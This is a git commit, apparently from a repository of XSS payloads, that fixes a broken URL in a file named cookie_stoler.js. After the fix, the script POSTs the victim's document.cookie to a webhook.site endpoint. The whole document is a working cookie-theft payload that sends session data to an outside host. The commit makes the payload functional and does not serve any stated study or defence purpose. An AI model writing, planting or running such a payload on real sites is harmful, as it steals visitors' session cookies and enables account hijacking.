8868482859b219f456b5a30dd1ea007da0aab272
Zoulouh65 <bstrazzera@an21.fr>
2025-05-05 12:05:23 +0200

    Update cookie_stoler.js

--- main/XSS/cookie_stoler.js
+++ main/XSS/cookie_stoler.js
@@ -1,5 +1,4 @@
-fetch("https://webhook.site/807b9d8f-40ce-4758-9119-f2895323714d
-    ", {
+fetch("https://webhook.site/807b9d8f-40ce-4758-9119-f2895323714d", {
   method: "POST",
   body: document.cookie
 });
